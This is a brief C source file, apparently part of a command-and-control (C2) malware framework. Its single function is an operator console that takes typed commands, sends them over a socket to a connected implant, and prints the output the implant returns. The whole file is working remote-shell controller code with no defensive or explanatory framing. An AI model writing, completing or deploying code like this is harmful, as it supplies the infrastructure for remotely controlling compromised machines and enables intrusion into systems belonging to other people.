#include <stdlib.h>
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include "c2.h"
#include "server/utils.h"
#include "common.h"
#include <string.h>

void psh_send(sock_t client_fd) {
    char buf[C2_BUF_SIZE];
    while (1) {
        printf("\nC2> ");
        fflush(stdout);
        if (!fgets(buf, C2_BUF_SIZE, stdin)) break;
        buf[strcspn(buf, "\n")] = 0;

        if (safe_send_payload(client_fd, buf, strlen(buf) + 1, 0) <= 0) break;

        if (strcmp(buf, "quit") == 0) break;
        
        char* cmd_output = (char*)safe_recv_payload(client_fd, NULL, 0);
        if (cmd_output) printf("%s\n", cmd_output);
        free(cmd_output);
    }
    return;
}